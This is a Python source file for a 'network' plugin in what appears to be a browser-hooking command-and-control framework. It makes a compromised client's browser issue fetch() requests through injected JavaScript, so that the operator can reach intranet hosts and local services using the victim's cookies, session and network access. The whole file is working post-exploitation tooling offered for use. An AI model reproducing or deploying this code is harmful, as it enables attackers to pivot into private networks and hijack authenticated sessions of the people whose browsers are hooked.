from c2.plugins.internal.plugins import BasePlugin


class NetworkPlugin(BasePlugin):
    name = "network"

    async def fetch(self, url: str, method: str = "GET", body: str = "", timeout: float = 30) -> dict:
        """Issues a fetch() request from inside the client browser and returns the response.

        Useful for reaching intranet hosts or local services that the C2 server
        cannot access directly.  The request originates from the client's browser,
        so it inherits the browser's cookies, session, and network context.

        :param url: URL to request
        :type url: str
        :param method: HTTP method (GET, POST, PUT, DELETE, …). Default "GET".
        :type method: str
        :param body: Request body (for POST/PUT). Default empty string.
        :type body: str
        :param timeout: Seconds to wait for the response. Default 30.
        :type timeout: float
        :return: Dict with keys: status (int), ok (bool), headers (dict), body (str)
        :rtype: dict
        """
        return await self.methods.eval_js(f'''
            return (async function() {{
                var opts = {{
                    method:  {method!r},
                    headers: {{}},
                }};
                if ({body!r}) opts.body = {body!r};

                var resp = await fetch({url!r}, opts);

                var headers = {{}};
                resp.headers.forEach(function(v, k) {{ headers[k] = v; }});

                return {{
                    status:  resp.status,
                    ok:      resp.ok,
                    headers: headers,
                    body:    await resp.text()
                }};
            }})();
        ''', timeout=timeout + 5)
